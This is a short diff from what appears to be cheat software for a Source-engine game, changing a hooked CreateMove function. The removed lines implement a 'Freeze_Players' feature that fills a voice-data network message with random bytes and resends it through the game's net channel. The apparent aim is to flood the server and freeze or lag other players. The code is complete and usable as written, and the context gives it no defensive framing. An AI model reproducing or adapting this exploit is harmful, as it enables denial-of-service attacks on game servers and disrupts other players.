@@ -504,31 +504,6 @@ bool __fastcall hkCreateMove(void*thisptr, void*edx, float flInputSampleTime, CU
 	}
 	
 	
-	if (Engine::Var::Instance().Freeze_Players.Get()) {
-		CLC_VoiceData voice;
-		static byte buff[0xFFFF];
-		static byte buff2[0xFFFF];
-		static bf_write MethodOneTap;
-
-		if (MethodOneTap.m_iCurBit == 0) {
-			ZeroMemory(buff, sizeof(buff));
-			MethodOneTap = bf_write("CNetChan_TransmitBits->send", buff, sizeof(buff));
-
-			voice.m_DataOut = bf_write("CNetChan_TransmitBits->send", buff2, sizeof(buff2));
-			for (auto kk = 0; kk < 0x1000; kk++) {
-				voice.m_DataOut.WriteByte(rand() % 0xFF);
-			}
-			voice.m_DataOut.SeekToBit(0x1000);
-			voice.m_nLength = 0x1000;
-			voice.WriteToBuffer(MethodOneTap);
-		}
-		auto nci = g_pEngine->GetNetChannelInfo();
-		if (nci) {
-			for (auto it = 0; it < 2; it++) {
-				 nci->SendDatagram(&MethodOneTap);
-			}
-		}
-	}
 
 	g_MovementRecorder.RecordCB(pLocal, pCmd);
 
